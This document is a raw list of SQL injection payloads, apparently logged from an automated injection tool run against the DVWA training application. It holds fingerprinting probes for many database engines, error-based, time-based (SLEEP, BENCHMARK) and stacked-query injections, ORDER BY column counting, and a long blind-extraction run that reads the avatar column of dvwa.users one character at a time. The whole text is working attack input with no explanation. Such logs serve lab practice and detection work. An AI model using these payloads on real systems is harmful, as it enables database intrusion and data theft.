"2...))',,("""
"2'BJFmIb<'"">sBuznf"
2) AND 4544=3303-- fIxm
2) AND 5489=5489-- kDxo
2') AND 3359=2153-- mhsG
2') AND 5489=5489-- XOZE
2' AND 2308=4240-- ICrE
2' AND 5489=5489-- Lphl
2' AND 7232=3419-- BFwH
2' AND (SELECT CVAR(NULL) FROM MSysAccessObjects) IS NULL-- hbxd
"2' AND (SELECT TDESENCRYPT(NULL,NULL)) IS NULL-- TidC"
2' AND (SELECT %SQLUPPER NULL) IS NULL-- qTTg
2' AND (SELECT halfMD5(NULL) IS NULL) IS NULL-- Cpdd
2' AND (SELECT MD5(NULL~NULL)) IS NULL-- rICW
2' AND (SELECT (NULL SETEQ NULL)) IS NULL-- YBQG
2' AND (SELECT CHR(82)||CHR(66)||CHR(67)||CHR(80) FROM SYSIBM.SYSDUMMY1)='RBCP'-- vPXg
"2' AND (SELECT NULLIF(USER,SESSION_USER) FROM SYSIBM.SYSDUMMY1) IS NULL-- ZaqW"
2' AND (SELECT NULLIFZERO(hashcode(NULL))) IS NULL-- tWTT
2' AND (SELECT 'oSfI' FROM RDB$DATABASE)='oSfI'-- yVmN
2' AND (SELECT 'wViw' FROM INFORMATION_SCHEMA.IO_STATISTICS)='wViw'-- Wkif
2' AND (SELECT STRINGTOUTF8(NULL)) IS NULL-- Jaiq
2' AND (SELECT CHAR(73)||CHAR(86)||CHAR(112)||CHAR(115) FROM INFORMATION_SCHEMA.SYSTEM_USERS)='IVps'-- TUQx
2' AND (SELECT 'UtwA' FROM SYSMASTER:SYSDUAL)='UtwA'-- Bfqk
2' AND (SELECT ALPHA(NULL) FROM VERSIONS) IS NULL-- TLMf
2' AND (SELECT TONUMBER(NULL)) IS NULL-- XkZJ
2' AND (SELECT ASCII_CHAR(256) FROM SYSTEM.ONEROW) IS NULL-- KxZc
2' AND (SELECT CODE(NULL)) IS NULL-- DeDo
"2' AND (SELECT DIFFERENCE(NULL,NULL)) IS NULL-- vpMZ"
2' AND (SELECT QUARTER(NULL XOR NULL)) IS NULL-- KLrP
2' AND (SELECT 0x78657667)='XDrP'-- rwzR
"2' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71787a6a71,(SELECT (ELT(9960=9960,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- KAOh"
"2' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71787a6a71,(SELECT (ELT(6090=6090,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- sGOl"
"2' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x71787a6a71,(SELECT (ELT(7705=7705,1))),0x717a767a71,0x78))x))-- jBcG"
"2' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71787a6a71,(SELECT (ELT(3325=3325,1))),0x717a767a71,0x78))x))-- BngJ"
"2' AND GTID_SUBSET(CONCAT(0x71787a6a71,(SELECT (ELT(7878=7878,1))),0x717a767a71),7878)-- jyRh"
"2' OR GTID_SUBSET(CONCAT(0x71787a6a71,(SELECT (ELT(1880=1880,1))),0x717a767a71),1880)-- YgUQ"
"2' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71787a6a71,(SELECT (ELT(2354=2354,1))),0x717a767a71)) USING utf8)))-- GZLg"
"2' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71787a6a71,(SELECT (ELT(2236=2236,1))),0x717a767a71)) USING utf8)))-- zHYE"
"2' AND (SELECT 2544 FROM(SELECT COUNT(*),CONCAT(0x71787a6a71,(SELECT (ELT(2544=2544,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dqde"
"2' OR (SELECT 2835 FROM(SELECT COUNT(*),CONCAT(0x71787a6a71,(SELECT (ELT(2835=2835,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BXeK"
"2' AND EXTRACTVALUE(5131,CONCAT(0x5c,0x71787a6a71,(SELECT (ELT(5131=5131,1))),0x717a767a71))-- xXyY"
"2' OR EXTRACTVALUE(9151,CONCAT(0x5c,0x71787a6a71,(SELECT (ELT(9151=9151,1))),0x717a767a71))-- QLDI"
"2' AND UPDATEXML(5891,CONCAT(0x2e,0x71787a6a71,(SELECT (ELT(5891=5891,1))),0x717a767a71),8129)-- lACi"
"2' OR UPDATEXML(3008,CONCAT(0x2e,0x71787a6a71,(SELECT (ELT(3008=3008,1))),0x717a767a71),7879)-- ydsN"
"2' AND ROW(7230,9582)>(SELECT COUNT(*),CONCAT(0x71787a6a71,(SELECT (ELT(7230=7230,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM (SELECT 9213 UNION SELECT 5108 UNION SELECT 6351 UNION SELECT 5379)a GROUP BY x)-- hUZw"
"2' OR ROW(5143,2397)>(SELECT COUNT(*),CONCAT(0x71787a6a71,(SELECT (ELT(5143=5143,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM (SELECT 8985 UNION SELECT 4804 UNION SELECT 3884 UNION SELECT 7918)a GROUP BY x)-- SKzI"
-8121
"-9599' OR 1 GROUP BY CONCAT(0x71787a6a71,(SELECT (CASE WHEN (5825=5825) THEN 1 ELSE 0 END)),0x717a767a71,FLOOR(RAND(0)*2)) HAVING MIN(0)#"
"2' PROCEDURE ANALYSE(EXTRACTVALUE(8342,CONCAT(0x5c,0x71787a6a71,(SELECT (CASE WHEN (8342=8342) THEN 1 ELSE 0 END)),0x717a767a71)),1)-- hgsJ"
"(SELECT CONCAT(CONCAT('qxzjq',(CASE WHEN (5005=5005) THEN '1' ELSE '0' END)),'qzvzq'))"
"(SELECT CONCAT(0x71787a6a71,(ELT(8034=8034,1)),0x717a767a71))"
2';SELECT SLEEP(5)#
2';SELECT SLEEP(5)-- pyVz
2';(SELECT * FROM (SELECT(SLEEP(5)))NlBE)#
2';(SELECT * FROM (SELECT(SLEEP(5)))elFt)-- CQTy
"2';SELECT BENCHMARK(5000000,MD5(0x744d6747))#"
"2';SELECT BENCHMARK(5000000,MD5(0x70764a4d))-- WoXS"
2' AND (SELECT 3389 FROM (SELECT(SLEEP(5)))WMTq)-- ZHKj
2' AND (SELECT 3389 FROM (SELECT(SLEEP(0)))WMTq)-- ZHKj
2' AND (SELECT 3389 FROM (SELECT(SLEEP(5)))WMTq)-- ZHKj
2' ORDER BY 1-- -
2' ORDER BY 8691-- -
2' ORDER BY 10-- -
2' ORDER BY 6-- -
2' ORDER BY 4-- -
2' ORDER BY 3-- -
2' ORDER BY 2-- -
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),15,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),15,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),15,1))>120-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),15,1))>116-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),15,1))>114-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),15,1))>115-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),16,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),16,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),16,1))>120-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),16,1))>116-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),16,1))>114-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),16,1))>115-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),17,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),17,1))>48-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),17,1))>1-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),17,1))>24-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),17,1))>36-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),17,1))>42-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),17,1))>45-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),17,1))>46-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),17,1))>47-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),18,1))>64-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),18,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),18,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),18,1))>104-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),18,1))>100-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),18,1))>102-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),18,1))>103-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),19,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),19,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),19,1))>104-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),19,1))>100-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),19,1))>98-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),19,1))>97-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),20,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),20,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),20,1))>104-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),20,1))>100-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),20,1))>98-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),20,1))>99-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),21,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),21,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),21,1))>104-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),21,1))>108-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),21,1))>106-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),21,1))>107-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),22,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),22,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),22,1))>104-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),22,1))>100-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),22,1))>98-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),22,1))>97-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),23,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),23,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),23,1))>104-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),23,1))>100-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),23,1))>98-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),23,1))>97-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),24,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),24,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),24,1))>104-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),24,1))>108-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),24,1))>106-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),24,1))>107-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),25,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),25,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),25,1))>104-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),25,1))>100-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),25,1))>102-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),25,1))>101-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),26,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),26,1))>48-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),26,1))>1-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),26,1))>24-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),26,1))>36-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),26,1))>42-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),26,1))>45-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),26,1))>46-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),26,1))>47-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),27,1))>64-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),27,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),27,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),27,1))>120-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),27,1))>116-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),27,1))>118-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),27,1))>117-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),28,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),28,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),28,1))>120-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),28,1))>116-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),28,1))>114-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),28,1))>115-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),29,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),29,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),29,1))>104-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),29,1))>100-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),29,1))>102-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),29,1))>101-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),30,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),30,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),30,1))>120-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),30,1))>116-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),30,1))>114-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),30,1))>113-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),31,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),31,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),31,1))>120-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),31,1))>116-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),31,1))>114-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),31,1))>115-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),32,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),32,1))>48-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),32,1))>1-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),32,1))>24-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),32,1))>36-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),32,1))>42-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),32,1))>45-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),32,1))>46-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),32,1))>47-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),33,1))>64-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),33,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),33,1))>112-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),33,1))>104-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),33,1))>100-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),33,1))>102-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),33,1))>103-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),34,1))>96-- XKTw"
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),34,1))>112-- XKTw"
